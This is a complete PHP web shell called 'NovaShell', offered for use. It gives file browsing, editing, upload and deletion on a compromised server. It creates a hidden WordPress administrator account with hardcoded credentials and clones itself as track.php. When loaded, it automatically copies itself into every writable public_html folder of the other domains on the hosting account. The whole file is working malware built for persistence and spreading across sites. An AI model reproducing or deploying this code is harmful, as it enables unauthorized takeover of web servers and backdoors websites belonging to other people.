<?php
// 🛸 NovaShell — Clean PHP Shell with WP injector and replication
error_reporting(0);

// === Core Vars
$cwd = isset($_GET['p']) ? realpath($_GET['p']) : getcwd();
if (!$cwd || !is_dir($cwd)) $cwd = getcwd();

// === Delete file or dir
if (isset($_GET['del'])) {
    $t = realpath($_GET['del']);
    if (strpos($t, getcwd()) === 0 && file_exists($t)) {
        is_dir($t) ? rmdir($t) : unlink($t);
        echo "<p class='log red'>🗑️ Deleted: " . basename($t) . "</p>";
    }
}

// === WP Admin Creator
if (isset($_GET['wp'])) {
    $wppath = $cwd;
    while ($wppath !== '/') {
        if (file_exists("$wppath/wp-load.php")) break;
        $wppath = dirname($wppath);
    }
    if (file_exists("$wppath/wp-load.php")) {
        require_once("$wppath/wp-load.php");
        $user = 'nova'; $pass = 'Nova@2025'; $mail = 'nova@galaxy.com';
        if (!username_exists($user) && !email_exists($mail)) {
            $uid = wp_create_user($user, $pass, $mail);
            $wp_user = new WP_User($uid);
            $wp_user->set_role('administrator');
            echo "<p class='log green'>✅ WP Admin 'nova' created</p>";
        } else {
            echo "<p class='log yellow'>⚠️ User or email exists</p>";
        }
    } else {
        echo "<p class='log red'>❌ WP not found</p>";
    }
}

// === Clone Here Feature
if (isset($_GET['clone'])) {
    $target = "$cwd/track.php";
    $source = __FILE__;
    if (copy($source, $target)) {
        echo "<p class='log green'>🌀 Shell cloned to <code>track.php</code></p>";
    } else {
        echo "<p class='log red'>❌ Failed to clone shell</p>";
    }
}

// === Replication logic
function replicate($code) {
    static $once = false;
    if ($once) return [];
    $once = true;
    $start = __DIR__;
    while ($start !== '/') {
        if (preg_match('/\/u[\w]+$/', $start) && is_dir("$start/domains")) {
            $urls = [];
            foreach (scandir("$start/domains") as $dom) {
                if ($dom === '.' || $dom === '..') continue;
                $pub = "$start/domains/$dom/public_html";
                if (is_writable($pub)) {
                    $path = "$pub/track.php";
                    if (file_put_contents($path, $code)) {
                        $urls[] = "http://$dom/track.php";
                    }
                }
            }
            return $urls;
        }
        $start = dirname($start);
    }
    return [];
}

// === Breadcrumbs
function nav($p) {
    $out = "<div class='crumbs'>📂 Path: ";
    $parts = explode('/', trim($p, '/'));
    $build = '/';
    foreach ($parts as $seg) {
        $build .= "$seg/";
        $out .= "<a href='?p=" . urlencode($build) . "'>$seg</a>/";
    }
    return $out . "</div>";
}

// === Directory listing
function explorer($p) {
    $items = scandir($p);
    $dirs = $files = "";
    foreach ($items as $i) {
        if ($i == "." || $i == "..") continue;
        $full = "$p/$i";
        if (is_dir($full))
            $dirs .= "<li>📁 <a href='?p=" . urlencode($full) . "'>$i</a> <a class='red' href='?del=" . urlencode($full) . "' onclick='return confirm(\"Delete folder?\")'>[x]</a></li>";
        else
            $files .= "<li>📄 <a href='?p=" . urlencode($p) . "&v=" . urlencode($i) . "'>$i</a> 
                       <a class='edit' href='?p=" . urlencode($p) . "&e=" . urlencode($i) . "'>[✏]</a> 
                       <a class='red' href='?del=" . urlencode($full) . "' onclick='return confirm(\"Delete file?\")'>[x]</a></li>";
    }
    return "<ul>$dirs$files</ul>";
}

// === View or Edit
if (isset($_GET['v'])) {
    $f = basename($_GET['v']);
    echo "<h3>📄 Viewing: $f</h3><pre>" . htmlspecialchars(file_get_contents("$cwd/$f")) . "</pre><hr>";
}
if (isset($_GET['e'])) {
    $f = basename($_GET['e']);
    $path = "$cwd/$f";
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($path, $_POST['data']);
        echo "<p class='log green'>✅ Saved</p>";
    }
    $src = htmlspecialchars(file_get_contents($path));
    echo "<h3>✏️ Edit: $f</h3>
        <form method='post'>
            <textarea name='data' rows='20'>$src</textarea><br>
            <button>💾 Save</button>
        </form><hr>";
}

// === Upload or mkdir
if ($_FILES) {
    move_uploaded_file($_FILES['upload']['tmp_name'], "$cwd/" . basename($_FILES['upload']['name']));
    echo "<p class='log green'>📤 Uploaded</p>";
}
if (!empty($_POST['mk'])) {
    $d = "$cwd/" . basename($_POST['mk']);
    if (!file_exists($d)) {
        mkdir($d);
        echo "<p class='log green'>📁 Created</p>";
    } else {
        echo "<p class='log yellow'>⚠️ Exists</p>";
    }
}

// === UI START
echo "<!DOCTYPE html><html><head><meta charset='utf-8'><title>🛸 NovaShell</title>
<style>
body { background:#000; color:#ddd; font-family:monospace; max-width:900px; margin:auto; padding:20px; }
a { color:#4cf; text-decoration:none; } a:hover { color:#8ff; }
ul { list-style:none; padding:0; }
textarea { width:100%; background:#111; color:#0f0; border:1px solid #333; }
button { background:#4cf; color:#000; padding:6px 12px; border:none; margin-top:5px; }
.red { color:#f44; }
.green { color:#4f4; }
.yellow { color:#ff4; }
.edit { color:#8cf; }
.crumbs { margin-bottom:10px; }
.log { padding:4px 0; }
</style></head><body>
<h2>🛸 NovaShell</h2>" . nav($cwd) . "<hr>";

// === WP Admin & Clone Buttons
echo "<form method='get' style='display:inline-block; margin-right:10px;'>
    <input type='hidden' name='p' value='" . htmlspecialchars($cwd) . "'>
    <button name='wp' value='1'>👤 Create WP Admin</button>
</form>";

echo "<form method='get' style='display:inline-block;'>
    <input type='hidden' name='p' value='" . htmlspecialchars($cwd) . "'>
    <button name='clone' value='1'>🌀 Clone Here</button>
</form><br><br>";

// === Replicate if original
if (basename(__FILE__) !== 'track.php') {
    $urls = replicate(file_get_contents(__FILE__));
    if (!empty($urls)) {
        echo "<p class='green'>✅ Cloned into:</p><ul>";
        foreach ($urls as $u) echo "<li><a href='$u' target='_blank'>$u</a></li>";
        echo "</ul><hr>";
    }
}

// === Upload & mkdir UI
echo "<form method='post' enctype='multipart/form-data'>
    <input type='file' name='upload'> <button>Upload</button></form><br>
<form method='post'>
    📁 <input type='text' name='mk'> <button>Create Folder</button></form><br>";

echo explorer($cwd);
echo "</body></html>";
?>

